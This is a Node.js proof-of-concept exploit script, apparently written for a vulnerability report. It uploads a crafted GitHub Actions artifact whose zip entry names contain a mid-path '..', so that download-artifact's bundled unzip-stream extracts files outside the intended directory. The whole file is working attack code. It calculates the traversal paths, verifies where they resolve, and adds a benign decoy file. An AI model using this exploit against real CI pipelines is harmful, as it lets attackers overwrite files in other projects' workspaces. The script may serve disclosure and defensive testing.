#!/usr/bin/env node
// Uploads a crafted artifact (same @actions/artifact internals as actions/upload-artifact)
// whose zip entry names contain a mid-path ".." so that download-artifact's bundled
// unzip-stream@0.3.1 extracts the member OUTSIDE the requested `path:`.
const fs = require('fs')
const path = require('path')
const A = '@actions/artifact'
const { createZipUploadStream } = require(`${A}/lib/internal/upload/zip`)
const { uploadZipToBlobStorage } = require(`${A}/lib/internal/upload/blob-upload`)
const { internalArtifactTwirpClient } = require(`${A}/lib/internal/shared/artifact-twirp-client`)
const { getBackendIdsFromToken } = require(`${A}/lib/internal/shared/util`)
const { StringValue } = require(`${A}/lib/generated`)

async function main() {
  const name = process.env.INPUT_NAME || 'docs-preview-dist'
  const extractDir = process.env.INPUT_EXTRACT_DIR_ABS
  const workspace = process.env.GITHUB_WORKSPACE
  const pairs = (process.env.INPUT_PAIRS || '').split(',').filter(Boolean)
  const spec = []
  for (const pair of pairs) {
    const [src, target] = pair.split('->')
    const sourcePath = path.join(workspace, src.trim())
    const targetAbs = path.join(workspace, target.trim())
    // non-dot first component is needed: leading "../" is stripped by the extractor
    const destinationPath = 'x/' + path.relative(path.join(extractDir, 'x'), targetAbs)
    const resolved = path.join(extractDir, destinationPath)
    if (resolved !== targetAbs) throw new Error(`path math mismatch: ${resolved} != ${targetAbs}`)
    console.log(`entry ${JSON.stringify(destinationPath)} -> ${resolved}`)
    spec.push({ sourcePath, destinationPath, stats: fs.lstatSync(sourcePath) })
  }
  // benign member that legitimately lands inside the extraction directory
  const benign = path.join(workspace, 'poc-payload', 'index.html')
  spec.push({ sourcePath: benign, destinationPath: 'index.html', stats: fs.lstatSync(benign) })

  const backendIds = getBackendIdsFromToken()
  const client = internalArtifactTwirpClient()
  const createResp = await client.CreateArtifact({
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    version: 4
  })
  if (!createResp.ok) throw new Error('CreateArtifact: response not ok')
  const zipStream = await createZipUploadStream(spec)
  const up = await uploadZipToBlobStorage(createResp.signedUploadUrl, zipStream)
  const fin = {
    workflowRunBackendId: backendIds.workflowRunBackendId,
    workflowJobRunBackendId: backendIds.workflowJobRunBackendId,
    name,
    size: up.uploadSize ? up.uploadSize.toString() : '0'
  }
  if (up.sha256Hash) fin.hash = StringValue.create({ value: `sha256:${up.sha256Hash}` })
  const finalizeResp = await client.FinalizeArtifact(fin)
  if (!finalizeResp.ok) throw new Error('FinalizeArtifact: response not ok')
  console.log(`artifact ${name} uploaded: id=${finalizeResp.artifactId}`)
}
main().catch(e => { console.error(e); process.exit(1) })
